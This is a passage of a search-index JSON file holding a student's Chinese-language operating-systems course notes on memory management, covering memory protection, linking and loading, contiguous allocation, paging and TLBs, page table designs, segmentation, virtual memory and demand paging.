\u5185\u5b58\u4fdd\u62a4","text":"<p>\u5728\u5185\u5b58\u7684\u57fa\u7840\u8bbe\u8ba1\u4e2d\uff0c\u7ed9\u6bcf\u4e2aProcess\u5728\u5185\u5b58\u4e2d\u5206\u914d\u4e00\u5757\u8fde\u7eed\u7a7a\u95f4\uff0c\u5176\u53ea\u9700\u8981\u68c0\u67e5\u8be5Process\u7684\u8bbf\u5b58\u662f\u5426\u5728\u8fd9\u4e2a\u8fde\u7eed\u7a7a\u95f4\u5373\u53ef</p> <p>\u200b\u200b</p> <p>\u8fd9\u91cc\u5f15\u5165\u4e86 base \u548c limit \u4e24\u4e2a\u7279\u6b8a\u7684\u5bc4\u5b58\u5668\uff0c\u5185\u5b58\u7684\u4fdd\u62a4\u901a\u8fc7\u5185\u5b58\u7ba1\u7406\u5355\u5143 MMU \u5b9e\u73b0\uff0cMMU\u4f1a\u5728Process\u6bcf\u6b21\u8bbf\u95ee\u5185\u5b58\u7684\u65f6\u5019\uff0c\u901a\u8fc7 base \u548c limit \u8fdb\u884c\u4e00\u4e0b\u68c0\u67e5</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/OS/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#32","title":"3.2 \u7a0b\u5e8f\u7684\u94fe\u63a5\u548c\u52a0\u8f7d","text":"<p>\u5730\u5740\u7ed1\u5b9a</p> <p>\u200b\u200b</p> <p>\u9759\u6001\u4ee3\u7801\u7a0b\u5e8f\u53d8\u4e3a\u52a8\u6001\u7684\u8fdb\u7a0b\uff0c\u5927\u6982\u9700\u8981\u4ee5\u4e0a\u51e0\u6b65</p> <p>\u52a0\u8f7d\u6280\u672f</p> <p>\u800c\u5728 load time \u7684\u65f6\u5019\uff0c\u7a0b\u5e8f\u7684load\u5b58\u5728\u4e09\u79cd\u65b9\u5f0f</p> <ul> <li>absolute load \u5c31\u76f4\u63a5\u4f7f\u7528\u7edd\u5bf9\u5730\u5740</li> <li> <p>relocatable load \u5b58\u5728\u4e24\u79cd\u5f62\u5f0f</p> </li> <li> <p>static \u5728\u88c5\u5165\u5185\u5b58\u7684\u65f6\u5019\u786e\u5b9a\u5730\u5740\uff0c\u6839\u636e\u88c5\u5165\u65f6\u7684\u4f4d\u7f6e\u8fdb\u884c\u504f\u79fb</p> </li> <li>dynamic \u5728\u8fd0\u884c\u7684\u8fc7\u7a0b\u4e2d\u624d\u786e\u5b9a\u5730\u5740\uff0c\u4f1a\u5728\u8fd0\u884c\u4e2d\u6362\u5165\u6362\u51fa</li> </ul> <p>\u7531\u4e8e\u591a\u9053\u6280\u672f\u7684\u5b58\u5728\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5185\u90e8\u5f80\u5f80\u5b58\u5728\u591a\u4e2a\u8fdb\u7a0b\u3002\u52a8\u6001\u88c5\u8f7d\u673a\u5236\u4f7f\u5f97\u6211\u4eec\u7075\u6d3b\u5730\u4f7f\u7528\u5185\u5b58\u8d44\u6e90\u3002</p> <p>\u5982\u679c\u4e00\u4e2a\u7a0b\u5e8f\u8fd8\u6ca1\u88ab\u8c03\u7528\uff0c\u5b83\u4ee5 relocatable load format \u5b58\u50a8\u5728\u78c1\u76d8\u4e0a\uff0c\u5f53\u5176\u88ab\u8c03\u7528\u7684\u65f6\u5019\u53ef\u4ee5\u88ab\u52a8\u6001\u5730\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u3002\u5bf9\u4e8e\u90a3\u4e9b\u5927\u91cf\u4f46\u662f\u4e0d\u7ecf\u5e38\u8bbf\u95ee\u7684\u4ee3\u7801\u7247\u6bb5\uff0c\u53ef\u4ee5\u8282\u7701\u5f88\u591a\u5185\u5b58\u7a7a\u95f4\uff0c\u4f8b\u5982\u9519\u8bef\u5904\u7406\u4ee3\u7801\u3002</p> <p>\u8be5\u9879\u6280\u672f\u5e94\u8be5\u7531\u5f00\u53d1\u8005\u5f00\u53d1\uff0c\u5176\u4e0d\u662fOS\u7684\u5185\u7f6e\u529f\u80fd</p> <p>link\u6280\u672f</p> <ul> <li>\u9759\u6001\u94fe\u63a5 \u76f4\u63a5\u628a\u7a0b\u5e8f\u548c\u5e93\u51fd\u6570\u94fe\u63a5\u6210\u4e00\u4e2a\u5b8c\u6574\u7684\u6a21\u5757\uff0c\u9700\u8981\u4fee\u6539\u76f8\u5bf9\u5730\u5740\uff0c\u5e76\u4e14\u53d8\u6362\u5916\u90e8\u8c03\u7528\u7b26\u53f7\u4e3a\u76f8\u5bf9\u5730\u5740</li> <li>\u88c5\u5165\u65f6\u52a8\u6001\u94fe\u63a5\uff0c\u5728\u88c5\u5165\u5185\u5b58\u7684\u65f6\u5019\uff0c\u8fb9\u88c5\u5165\u8fb9\u94fe\u63a5\uff0c\u4fbf\u4e8e\u4fee\u6539\u548c\u66f4\u65b0</li> <li>\u8fd0\u884c\u65f6\u52a8\u6001\u94fe\u63a5\uff0c\u5728\u8fd0\u884c\u5230\u5bf9\u5e94\u6a21\u5757\u7684\u65f6\u5019\uff0c\u624d\u8fdb\u884c\u94fe\u63a5\uff0c\u53ef\u8282\u7701\u5185\u5b58\u7a7a\u95f4</li> </ul> <p>\u8fd9\u9879\u6280\u672f\u4e3b\u8981\u6307\u7684\u662f\u52a8\u6001\u94fe\u63a5\u5e93 dynamic linked libraries. \u8fd9\u7c7b\u5e93\u53ef\u4ee5\u88ab\u591a\u4e2a\u8fdb\u7a0b\u5171\u4eab\uff0c\u4e5f\u88ab\u79f0\u4e3a\u5171\u4eab\u5e93\u3002</p> <p>\u8be5\u9879\u6280\u672f\u9700\u8981OS\u7684\u652f\u6301</p> <p>\u200d</p>"},{"location":"ZJU-course/OS/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#33","title":"3.3 \u8fde\u7eed\u5206\u914d*","text":"<ul> <li> <p>Fixed Partition: \u5728\u7b14\u8bb0\u4e2d\u7684\u8fd9\u90e8\u5206\u5c31\u662f\u5c06\u5185\u5b58\u5212\u5206\u4e3a\u76f8\u7b49\u5927\u5c0f\u7684\u5757\uff0c\u7136\u540e\u5206\u914d\u7ed9process\u4f7f\u7528</p> </li> <li> <p>\u7f3a\u70b9\u5728\u4e8e\u6709Internal Fragmentation\uff0c\u8fd8\u6709\u8fdb\u7a0b\u592a\u5927\u653e\u4e0d\u8fdb\u6765\u7684\u95ee\u9898</p> </li> <li>\u5728\u738b\u9053\u4e2dFixed partition\u8fd8\u53ef\u4ee5\u5212\u5206\u6210\u4e0d\u540c\u5927\u5c0f\u7684block\uff0c\u4f46\u662f\u8fd9\u4e9b\u5927\u5c0f\u90fd\u662f\u521d\u59cb\u56fa\u5b9a\u7684</li> <li> <p>Variable Partition \u5982\u4e0b\u56fe</p> </li> <li> <p>\u7f3a\u70b9\u5728\u4e8e\u6709 External Fragmentation</p> </li> </ul> <p>\u200b\u200b</p> <p>\u5e76\u4e14\u57fa\u4e8e\u8be5\u5206\u914d\u65b9\u6cd5\uff0c\u6211\u4eec\u8fd8\u6709 Dynamic Storage-Allocation Problem</p> <ul> <li> <p>First Fit \u5206\u914d\u9996\u4e2a\u8db3\u591f\u5927\u7684hole</p> </li> <li> <p>\u5bb9\u6613\u5728\u4e2d\u4f4e\u5730\u5740\u4ea7\u751f\u5927\u91cf\u788e\u7247</p> </li> <li> <p>Best Fit \u5206\u914d\u8db3\u591f\u5927\u7684\u6700\u5c0fhole</p> </li> <li> <p>\u9700\u8981\u904d\u5386\uff0c\u540c\u6837\u6709\u788e\u7247</p> </li> <li> <p>Worst Fit \u5206\u914d\u6700\u5927\u7684hole</p> </li> <li> <p>\u9700\u8981\u904d\u5386\uff0c\u5728\u4e2d\u5c0f\u8fdb\u7a0b\u8f83\u591a\u7684\u60c5\u51b5\u4e0b\u6027\u80fd\u8f83\u597d\uff08\u76f8\u5bf9\u788e\u7247\u5c11\uff09</p> </li> </ul> <p>\u57fa\u4e8e\u7d22\u5f15\u5206\u914d\u7b97\u6cd5</p> <p>\u4e0a\u8ff0\u7684\u5206\u914d\u7b97\u6cd5\u90fd\u662f\u987a\u5e8f\u7684\u5206\u914d\u7b97\u6cd5\uff0c\u53ef\u80fd\u4f1a\u6bd4\u8f83\u4f4e\u6548</p> <p>\u8fd9\u90e8\u5206\u6765\u81ea\u4e8e\u738b\u9053</p>"},{"location":"ZJU-course/OS/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#34","title":"3.4 \u5206\u9875\u7ba1\u7406","text":"<p>\u5206\u9875\u6280\u672f\u7684\u76ee\u6807\u662f\u51cf\u8f7b\u8fdb\u7a0b\"\u5fc5\u987b\u4f7f\u7528\u8fde\u7eed\u5185\u5b58\u201d\u8fd9\u4e2a\u9650\u5236\uff0c\u6240\u8c13\u8fde\u7eed\u5185\u5b58\u662f\u4e00\u79cd\u903b\u8f91\u4e0a\u7684\u8fde\u7eed\uff0c\u4e5f\u5c31\u662f\u865a\u62df\u5730\u5740\u7684\u8fde\u7eed\u5373\u53ef\u3002</p> <p>\u4f46\u8fd9\u4e0d\u610f\u5473\u7740\u7269\u7406\u5730\u5740\u7684\u8fde\u7eed\u6ca1\u6709\u610f\u4e49\uff0c\u5927\u91cf\u4e0d\u8fde\u7eed\u7684\u7269\u7406\u5730\u5740\u4f1a\u5bfc\u81f4\u5f88\u4f4e\u7684\u8bbf\u95ee\u6548\u7387</p> <p>\u6211\u4eec\u8bbe\u8ba1\u4e00\u4e2a\u6298\u4e2d\u7684\u65b9\u6848\uff0c\u5c06\u7269\u7406\u5185\u5b58\u5212\u5206\u4e3a\u56fa\u5b9a\u5927\u5c0f\u7684\u5757\uff0c\u79f0\u4e3a \u5e27 frames \u6bcf\u4e2a\u5e27\u5bf9\u5e94\u865a\u62df\u5730\u5740\u4e2d\u7b49\u5927\u7684 \u9875 pages</p> <p>\u9875 &amp; \u865a\u62df\u5730\u5740</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u865a\u62df\u5730\u5740\u6765\u8bf4\uff0c\u53ef\u4ee5\u5212\u5206\u4e3a\u5982\u4e0b\u72b6\u6001</p> <p>\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u53d6 4Kb Page Size\uff0c\u90a3\u4e48 page offset \u662f \\(\\log_2 4096=12\\)</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502page number    \u2502page offset   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n p: m-n bits     d: n bits\n</code></pre> <p>\u6620\u5c04\u8fc7\u7a0b</p> <p>\u865a\u62df\u5730\u5740\u5230\u7269\u7406\u5730\u5740\u7684\u6620\u5c04\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e0b\u56fe\u63cf\u8ff0</p> <p>\u200b\u200b</p> <p>\u5728 Page table \u4e2d\u5f80\u5f80\u4f1a\u6709\u4e00\u4e9bbit\u6765\u5b9e\u73b0\u4fdd\u62a4\u673a\u5236\uff0c\u56e0\u4e3a\u6709\u4e00\u4e9bpage\u8fd8\u672a\u5b9e\u73b0\u6620\u5c04</p> <p>\u800c\u5728page table\u4e2d\uff0c\u5176\u5b9e\u53ea\u5b58\u50a8\u4e86\u5757\u53f7\uff0c\u800c\u4e0d\u5b58\u50a8\u9875\u53f7\uff0c\u9875\u53f7\u662f\u9690\u542b\u5728\u8fde\u7eed\u6392\u5217\u7684\u987a\u5e8f\u4e2d</p> <p>\u5bf9\u4e8e page size \u7684\u9009\u62e9\u800c\u8a00</p> <ul> <li>page size \u8d8a\u5927\uff0c\u9875\u8868\u9879\u5c11\uff0c\u9875\u66f4\u5bb9\u6613\u88ab\u6d6a\u8d39\uff0c\u4f46\u5bf9\u4e8e\u78c1\u76d8\u800c\u8a00\uff0c\u5355\u6b21\u5927\u91cf\u7684\u4f20\u8f93\u6548\u7387\u66f4\u9ad8</li> <li>page size \u8d8a\u5c0f\uff0c\u9875\u8868\u9879\u591a\uff0c\u9700\u8981\u66f4\u591a\u5185\u5b58\u548c\u65f6\u95f4\u5904\u7406\u9875\u8868</li> </ul> <p>\u786c\u4ef6\u652f\u6301</p> <p>\u9875\u8868\u662f per-process data structures \u4f5c\u4e3a\u4e00\u4e2a\u8fdb\u7a0b\u7684\u5143\u6570\u636e\u88ab\u7ef4\u62a4\u3002\u4f46\u662f\u9875\u8868\u672c\u8eab\u6240\u5360\u7684\u7a7a\u95f4\u8f83\u5927\uff0c\u56e0\u6b64\u5176\u88ab\u653e\u5728\u5185\u5b58\u91cc\uff0c\u6211\u4eec\u901a\u8fc7\u5bc4\u5b58\u5668\u7ef4\u62a4\u4e00\u4e2a\u6307\u5411\u9875\u8868\u7684\u6307\u9488\u6765\u7ef4\u62a4\u9875\u8868\u3002</p> <p>\u8fd9\u4e2a\u5bc4\u5b58\u5668\u79f0\u4e3a \u9875\u8868\u57fa\u5740\u5bc4\u5b58\u5668\uff08page-table base register PTBR\uff09</p> <p>\u5f53\u8be5\u8fdb\u7a0b\u4e0d\u5904\u4e8erunning\u7684\u65f6\u5019\uff0cPTBR\u88ab\u5b58\u50a8\u5728PCB\u4e2d</p> <p>TLB\u673a\u5236</p> <p>\u5185\u5b58\u8bbf\u95ee\u5bf9\u4e8e\u73b0\u4ee3CPU\u6765\u8bf4\u8fd8\u662f\u592a\u6162\u4e86\uff0c\u7531\u4e8e\u9875\u8868\u672c\u8eab\u5728\u5185\u5b58\u4e2d\uff0c\u652f\u6301\u865a\u62df\u5730\u5740\u76f4\u63a5\u8ba9\u6211\u4eec\u7684\u5185\u5b58\u8bbf\u95ee\u6b21\u6570\u7ffb\u500d\u4e86\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u91c7\u53d6\u4e00\u4e9b\u63aa\u65bd</p> <p>\u6211\u4eec\u5f15\u5165 TLB \u9875\u8868\u7f13\u5b58 translation look-aside buffer, \u4f5c\u4e3aMMU\u7684\u4e00\u90e8\u5206\uff0c\u9875\u53f7\u548c\u5e27\u597d\u4ee5key-value\u5bf9\u7684\u5f62\u5f0f\u5b58\u50a8\u5728TLB\u4e2d\uff0c\u4e0d\u4ec5\u8bbf\u95ee\u901f\u5ea6\u5feb\uff0c\u5e76\u4e14\u5141\u8bb8\u5e76\u884c\u7684\u67e5\u8be2\u6240\u6709key-value\u5bf9</p> <p>\u4f46\u662fTLB\u672c\u8eab\u4e00\u822c\u8f83\u5c0f\uff0c\u5f80\u5f80\u53ea\u6709 32 - 1024 \u4e2a\u8868\u9879\u3002\u4f5c\u4e3a\u4e00\u4e2a\u7f13\u5b58\uff0c\u4f1a\u5b58\u5728miss\uff0c\u6211\u4eec\u4e5f\u9700\u8981\u4e00\u5b9a\u7684\u7f13\u5b58\u66ff\u6362\u673a\u5236\uff0c\u4f8b\u5982\uff08LRU\uff0cround-robin to random\u7b49\uff09</p> <p>TLB\u5141\u8bb8\u7279\u5b9a\u7684\u8868\u9879\u88ab wired down\uff0c\u8fd9\u4e9b\u8868\u9879\u4e0d\u5141\u8bb8\u88ab\u66ff\u6362</p> <p>TLB\u5e76\u4e0d\u662f per-process data structures</p> <p>\u5728context switch\u7684\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u6e05\u7a7aTLB\uff0c\u8fdb\u884cflush\u64cd\u4f5c\uff0c\u5426\u5219\u4f1a\u4ea7\u751f\u9519\u8bef\u3002</p> <p>\u6216\u8005\u6211\u4eec\u5728TLB\u7684\u8868\u9879\u4e2d\u589e\u52a0\u4e00\u4e2a\u5730\u5740\u7a7a\u95f4\u6807\u8bc6\u7b26\uff08address-space identifers ASID),  \u5728\u67e5\u8be2\u9875\u53f7\u7684\u65f6\u5019\u4e5f\u6bd4\u8f83ASID\uff0c\u53ea\u6709ASID\u4e00\u81f4\u624d\u7b97\u5339\u914d\u6210\u529f</p> <p>\u200b\u200b</p> <p>\u5b9a\u91cf\u5206\u6790 TLB</p> <p>\u200b\u200b</p> <p>\u5171\u4eab\u9875</p> <p>\u865a\u62df\u5730\u5740\u548c\u7269\u7406\u5730\u5740\u9875\u7684\u6620\u5c04\u5e76\u975e\u603b\u662f\u4e00\u5bf9\u4e00\uff0c\u591a\u4e2a\u9875\u53ef\u4ee5\u5bf9\u5e94\u4e00\u4e2aframe\uff0c\u8fd9\u5c31\u662f\u5171\u4eab shared page</p> <p>\u4f8b\u5982\u591a\u4e2a\u8fdb\u7a0b\u53ef\u80fd\u4f7f\u7528\u540c\u4e00\u4e2a\u5e93\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5e93\u6240\u5728\u7684pages\u5c31\u53ef\u4ee5\u505a\u5171\u4eab\uff0c\u4ee5\u51cf\u5c11\u5185\u5b58\u5f00\u9500</p> <p>\u5206\u9875\u53ef\u4ee5\u5141\u8bb8\u8fdb\u7a0b\u95f4\u5171\u4eab\u4ee3\u7801\uff0c\u4f8b\u5982\u540c\u4e00\u7a0b\u5e8f\u7684\u591a\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u4f7f\u7528\u540c\u4e00\u4efd\u4ee3\u7801\uff0c\u53ea\u8981\u8fd9\u4efd\u4ee3\u7801\u662f reentrant code \uff08or non-self-modifying code : never changes between execution\uff09</p> <p>\u4f8b\u5982\u6211\u4eec\u5728\u8fdb\u7a0b\u901a\u4fe1\u4e2d\u63d0\u5230\u8fc7\u5171\u4eab\u5185\u5b58\u5b9e\u73b0\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff0c\u8fd9\u4e2a\u673a\u5236\u5c31\u53ef\u4ee5\u901a\u8fc7\u5171\u4eab\u9875\u5b9e\u73b0</p> <p>**\u9875\u8868\u8bbe\u8ba1\u6539\u8fdb ***</p> <p>\u9996\u5148\u6211\u4eec\u8003\u8651\u9875\u8868\u73b0\u5728\u7684\u5b58\u5728\u65b9\u5f0f\uff0c\u9875\u8868\u5360\u636e\u7684\u662f\u4e00\u5757\u8fde\u7eed\u7684\u7269\u7406\u5185\u5b58\uff08\u5176\u672c\u8eab\u662f\u865a\u62df\u5730\u5740\u7684\u57fa\u7840\uff0c\u56e0\u6b64\u5176\u672c\u8eab\u4e0d\u662f\u865a\u62df\u5730\u5740\uff09</p> <p>\u5e76\u4e14\u6bcf\u4e2a\u6620\u5c04\u6211\u4eec\u90fd\u9700\u8981\u5b58\u50a8\uff0c\u6211\u4eec\u6765\u770b\u770b\u4e00\u4e2a32\u4f4d\u7684\u865a\u62df\u5730\u5740\uff0c12\u4f4d\u7684offset\uff0c\u5c31\u670920\u4f4d\u7684\u9875\u53f7\uff0c\u4e5f\u5c31\u6709\\(2^{20}\\) \u4e2a\u8868\u9879\uff0c\u5047\u8bbe\u4e00\u4e2a\u8868\u9879 4 bytes\uff0c\u5c31\u6709 4 Mb \u7684\u7269\u7406\u5185\u5b58\uff0c\u5b9e\u5728\u592a\u5927\u4e86</p> <p>\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u4e00\u4e9b\u673a\u5236\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898</p> <ul> <li> <p>\u5206\u5c42\u9875\u8868</p> </li> <li> <p>\u6211\u4eec\u53ef\u4ee5\u5c06\u9875\u8868\u8bbe\u8ba1\u6210\u5206\u5c42\u7684\u673a\u5236\uff0c\u5982\u679c\u4e0a\u5c42\u9875\u8868\u8282\u70b9\u4e0b\u7684\u8868\u9879\u90fd\u6ca1\u6709\u6620\u5c04\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bbe\u7f6einvalid\uff0c\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\uff0c\u53ef\u4ee5\u8282\u7701\u7ef4\u62a4\u9875\u8868\u6240\u9700\u7684\u5185\u5b58\u7a7a\u95f4</p> </li> <li>\u5176\u6709\u4e00\u4e2a\u9690\u542b\u7684\u8981\u6c42\u662f\u6839\u9875\u8868\u7684\u5927\u5c0f\u4e0d\u80fd\u8d85\u8fc7\u4e00\u4e2apage *</li> <li> <p>\u54c8\u5e0c\u9875\u8868</p> </li> <li> <p>\u6211\u4eec\u8981\u652f\u6301 random access \u5c31\u8981\u7ef4\u62a4\u4e00\u4e2a\u8fde\u7eed\u7684\u9875\u8868\uff0c\u8fd9\u4e2a\u8fde\u7eed\u662f\u865a\u62df\u5730\u5740\u4e0a\u7684\u8fde\u7eed\uff0c\u5176\u5b9e\u5f88\u591a\u9875\u8868\u9879\u90fd\u662finvalid\u7684\uff0c\u4f46\u662f\u56e0\u4e3a\u8981\u7ef4\u62a4random access\u7684\u6027\u8d28\uff0c\u5c31\u9700\u8981\u8ba9\u5176\u8fde\u7eed</p> </li> <li>\u4f46\u662f\u53e6\u4e00\u79cdrandom access\u7684\u5c31\u662f\u7ef4\u62a4hash map\uff0c\u4ee5\u9875\u53f7\u7684hash\u4e3a\u7d22\u5f15\uff0c\u7ef4\u62a4\u4e00\u4e2a\u94fe\u8868</li> <li>hash page table \u7684\u8bbf\u5b58\u5206\u6790 *</li> <li> <p>\u53cd\u5f0f\u9875\u8868</p> </li> <li> <p>\u6211\u4eec\u4e0d\u7ef4\u62a4\u865a\u62df\u5730\u5740\u5230\u7269\u7406\u5730\u5740\u7684\u6620\u5c04\uff0c\u800c\u662f\u7ef4\u62a4\u7269\u7406\u5730\u5740\u5230\u865a\u62df\u5730\u5740\u7684\u6620\u5c04</p> </li> <li>\u4e0d\u9700\u8981\u4e00\u4e2a\u8fdb\u7a0b\u4e00\u4e2a\u9875\u8868\uff0c\u6574\u4e2aOS\u5171\u7528\u4e00\u4e2a\u9875\u8868</li> <li>\u4e0d\u652f\u6301\u5171\u4eab\u9875\u5e76\u4e14\u6bcf\u6b21\u865a\u62df\u5730\u5740\u67e5\u8be2\u8981\u904d\u5386\u6574\u4e2a\u9875\u8868\uff0c\u76f8\u5f53\u4e8e\u5931\u53bb\u4e86random access\u7684\u6027\u8d28</li> <li>\u5176\u4ed6 \u6bb5\u5f0f\u8bbe\u8ba1\u7b49\u7b49</li> </ul>"},{"location":"ZJU-course/OS/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#35","title":"3.5 \u5206\u6bb5\u5b58\u50a8\u548c\u6bb5\u9875\u5b58\u50a8 *","text":"<p>\u5206\u6bb5\u7ba1\u7406\u7684\u8bbe\u8ba1\u8003\u8651\u7684\u662f\u7528\u6237\u548c\u7a0b\u5e8f\u5458\uff0c\u4ee5\u6ee1\u8db3\u65b9\u4fbf\u53d8\u6210\uff0c\u4fe1\u606f\u4fdd\u62a4\u4e0e\u5171\u4eab\uff0c\u52a8\u6001\u589e\u957f\u548c\u52a8\u6001\u94fe\u63a5\u7b49\u591a\u65b9\u9762\u9700\u8981</p> <p>\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u662f\u4e8c\u7ef4\u7684\uff0c\u6709\u4e00\u4e2a\u6bb5\u53f7\uff0c\u6709\u4e00\u4e2a\u6bb5\u5185\u504f\u79fb\u91cf\uff0c\u6bcf\u4e2a\u6bb5\u90fd\u4ece0\u5f00\u59cb\u7f16\u5740</p> <p>\u5206\u6bb5\u7ba1\u7406\u662f\u4e8c\u7ef4\u7684\uff0c\u800c\u5206\u9875\u7ba1\u7406\u662f\u4e00\u7ef4\u7684</p> <p>\u6bb5\u9875\u5f0f\u7ba1\u7406</p> <p>\u4e00\u4e2a\u8fdb\u7a0b\u4e00\u4e2a\u6bb5\u8868\uff0c\u4e00\u4e2a\u6bb5\u4e00\u4e2a\u9875\u8868</p>"},{"location":"ZJU-course/OS/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#36","title":"3.6 \u865a\u62df\u5185\u5b58\u57fa\u7840\u6982\u5ff5","text":"<p>address space \u7684\u5927\u5c0f\u662f\u7531\u5bfb\u5740\u7684\u4f4d\u6570\u786e\u5b9a\u7684</p> <p>\u865a\u62df\u5185\u5b58\u6280\u672f\u6269\u5c55\u4e86\u5185\u5b58\u7684\u6982\u5ff5\uff0c\u5f15\u5165\u4e86page fault\uff0c\u4f7f\u5f97\u5185\u5b58\u7684\u7ba1\u7406\u66f4\u52a0\u7075\u6d3b</p> <p>page fault\u6709\u4e09\u79cd\u60c5\u51b5\uff0c\u8fd9\u4e09\u79cd\u60c5\u51b5\u5747\u4e3a\u5f02\u5e38</p> <ol> <li>\u5f53\u524d\u7684\u8fdb\u7a0b\u7684\u9875\u8868\u4e2d\u5e76\u6ca1\u6709\u8fd9\u4e2a\u865a\u62df\u5730\u5740\u5bf9\u5e94\u7684 page\uff1b</li> <li>\u6743\u9650\u4e0d\u7b26\uff0c\u4f8b\u5982\u8bd5\u56fe\u8fd0\u884c\u67d0\u4e2a\u6743\u9650\u4f4d\u662f <code>RW-</code>\u200b \u7684 page \u4e2d\u7684\u4ee3\u7801\uff0c\u6216\u8005\u8bd5\u56fe\u5199\u5165\u67d0\u4e2a\u6743\u9650\u4f4d\u662f <code>R-X</code>\u200b \u6216 <code>R--</code>\u200b \u7684 page \u4e2d\u7684\u67d0\u4e2a\u5185\u5b58\u5355\u5143\uff1b</li> <li>\u5f53\u524d\u865a\u62df\u5730\u5740\u662f\u5408\u6cd5\u7684\uff0c\u4f46\u662f\u5bf9\u5e94\u7684 page \u88ab swapped out \u4e86\u3002</li> </ol> <p>\u524d\u4e24\u79cd\u662f\u62a5\u9519\uff0c\u6700\u540e\u4e00\u79cd\uff0cOS\u4f1a\u628a\u8fdb\u7a0b\u963b\u585e\u5e76\u4e14\u5b8c\u6210swap</p> <p>page fault \u5904\u7406\u673a\u5236</p> <ul> <li>\u68c0\u67e5PCB\u7684\u5185\u90e8\u8868\uff08VMA\uff09\uff0c\u786e\u8ba4\u8fd9\u662f\u4e00\u4e2a\u9700\u8981\u52a0\u8f7d\u7684page\u8fd8\u662f\u4e00\u4e2a\u9519\u8bef\u8bbf\u95ee</li> <li> <p>\u4ece\u53ef\u7528\u5e27\u5217\u8868\u4e2d\u62ff\u51faframe\u7528\u6765\u5199\u5165</p> </li> <li> <p>\u82e5\u6ca1\u6709\u53ef\u7528\u5e27\uff0c\u5219\u6267\u884c\u66ff\u6362\u7b56\u7565</p> </li> <li>\u4ece\u540e\u5907\u5b58\u50a8\u8bfb\u53d6\u5185\u5bb9\uff0c\u5e76\u4e14\u5199\u5165frame</li> <li>\u5b8c\u6210\u8bfb\u5199\u4e4b\u540e\uff0c\u66f4\u65b0\u5185\u90e8\u8868\u548c\u9875\u8868\u6620\u5c04</li> <li>\u91cd\u65b0\u6267\u884c\u5f15\u8d77 page fault \u7684 instruction</li> </ul> <p>page fault\u7684\u6b63\u5e38\u5904\u7406\u662f\u975e\u5e38\u6162\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5c3d\u53ef\u80fd\u51cf\u5c11page fault\u7684\u4ea7\u751f</p>"},{"location":"ZJU-course/OS/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#37","title":"3.7 \u7528\u6237\u5730\u5740\u548c\u5185\u6838\u5730\u5740","text":""},{"location":"ZJU-course/OS/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#38-demand-paging","title":"3.8 Demand Paging","text":"<p>demand paging \u6307\u7684\u662f\u53ea\u628a\u88ab\u9700\u8981\u7684\u9875\u8f7d\u5165\u5185\u5b58</p> <ul> <li>pure demand paging \u5728\u88ab\u9700\u6c42\u4e4b\u524d\uff0c\u4efb\u4f55page\u90fd\u4e0d\u4f1a\u88ab\u8f7d\u5165\u5185\u5b58</li> <li>pre-paginng \u4e0a\u8ff0\u673a\u5236\u5728\u7a0b\u5e8f\u5f00\u59cb\u4e4b\u524d\u4f1a\u4ea7\u751f\u5927\u91cf\u7684page fault\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u4e00\u5f00\u59cb\u5c06\u9700\u8981\u7684\u9875\u4e00\u8d77\u5b58\u5165\u5185\u5b58</li> </ul> <p>\u5f15\u5165\u4ea4\u6362\u6280\u672f\u4e4b\u524d\uff0c\u6211\u4eec\u7684\u8bbf\u95ee\u5730\u5740\u5982\u679c\u662finvalid\uff0c\u5c31\u8bf4\u660e\u7a0b\u5e8f\u51fa\u9519\u4e86\uff0c\u8bbf\u95ee\u4e86\u4e0d\u8be5\u8bbf\u95ee\u7684\u5730\u5740\uff1b\u800c\u5f15\u5165\u4ea4\u6362\u6280\u672f\u4e4b\u540e\uff0c\u5373\u4fbf\u8bbf\u95ee\u7684\u5730\u5740\u662finvalid\uff0c\u6211\u4eec\u5e94\u8be5\u751f\u6210\u4e00\u4e2a\u5f02\u5e38 page fault\uff0c\u501f\u6b64\u6765\u68c0\u67e5\u5e94\u8be5\u8fdb\u884c\u9875\u4ea4\u6362\u8fd8\u662f\u62a5\u9519</p> <ul> <li>major/hard page fault \u7f3a\u5c11\u7684\u9875\u4e0d\u5b58\u5728\u4e8e\u5185\u5b58\u4e2d</li> <li> <p>minor/soft page fault \u7f3a\u5c11\u7684\u9875\u5b58\u5728\u4e8e\u5185\u5b58\u4e2d\uff0c\u4f46\u662f\u672a\u5efa\u7acb\u6620\u5c04</p> </li> <li> <p>\u53ef\u80fd\u662f\u9700\u8981\u5171\u4eab\u5176\u4ed6\u8fdb\u7a0b\u7684page</p> </li> 